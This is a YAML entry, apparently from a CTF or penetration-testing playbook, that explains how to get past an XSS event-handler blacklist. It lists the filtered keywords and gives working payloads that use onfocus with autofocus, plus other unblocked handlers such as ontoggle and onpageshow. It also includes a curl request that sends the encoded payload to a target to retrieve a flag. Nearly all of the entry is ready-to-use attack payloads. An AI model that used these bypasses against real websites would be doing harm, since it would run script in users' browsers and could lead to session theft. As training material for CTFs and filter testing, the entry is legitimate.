name: xss_onfocus_event_bypass
category: web
tags: [xss, event_handler, onfocus, autofocus, blacklist_bypass]
indicators:
  - "Event handler blacklist (onload, onclick, onmouseover)"
  - "Single quote filtered"
  - "Slash filtered"
  - "User input directly in HTML"

tricks:
  - name: "Step 1: Identify blacklist"
    when: "Found XSS input point"
    how: "Analyze filtered keywords"
    payload: |
      # Blacklist: script, onload, onclick, onmouseover, ', /
      # onfocus is NOT in the blacklist!
      # Single quote ' is filtered, but double quote " is allowed

  - name: "Step 2: Use onfocus with autofocus"
    when: "onfocus not blacklisted"
    how: "Create input with onfocus and autofocus"
    payload: |
      <input onfocus=alert("XSS") autofocus>
      # onfocus triggers when element gets focus
      # autofocus automatically focuses the element
      # Double quotes used instead of single quotes

  - name: "Step 3: Trigger XSS and get flag"
    when: "Execute attack"
    how: "Send payload via name parameter"
    payload: |
      curl "http://TARGET/page?name=<input%20onfocus=alert(%22XSS%22)%20autofocus>"
      # Response: Congratulations! Here is the flag: flag{...}

  - name: "Alternative: Other unblocked events"
    when: "Need variations"
    how: "Try other event handlers"
    payload: |
      <input onblur=alert("XSS") autofocus>
      <body onpageshow=alert("XSS")>
      <details open ontoggle=alert("XSS")>
      <marquee onstart=alert("XSS")>
